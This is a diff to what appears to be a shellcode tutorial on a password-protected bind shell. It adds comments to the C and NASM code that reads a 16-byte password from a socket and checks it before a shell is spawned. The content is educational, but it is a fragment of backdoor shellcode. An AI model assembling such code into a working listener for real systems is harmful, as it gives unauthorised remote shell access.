@@ -261,6 +261,8 @@ syscall
 
 <h3>Stage 6 - Wait for input (password) to be received and compare it against the correct password string</h3>
 
+"db" (data byte) to allocate some space, and fill it with a string.
+
 ```c
 read(new_sock, buf, 16);
 buf[strcspn(buf, "\n")] = 0;
@@ -270,10 +272,10 @@ if (strcmp(arguments[3], buf) == 0)
 ```
 
 ```nasm
-xor rax, rax
+xor rax, rax ;zero out rax - read syscall number = 0
 
-push r10
-push r11
+push r10 ;push 8 bytes to the stack for 16 byte password support
+push r11 ;push another 8 bytes to the stack for 16 byte password support
 mov rsi, rsp
 
 mov rdx, 16
@@ -285,7 +287,7 @@ scasq
 jne exit
 
 ; change as needed
-pass: db "16bytessssss"
+pass: db "16bytessssss" ;define a password
 ```
 
 <h3>Stage 7 - Spawn the shell, if password is correct</h3>
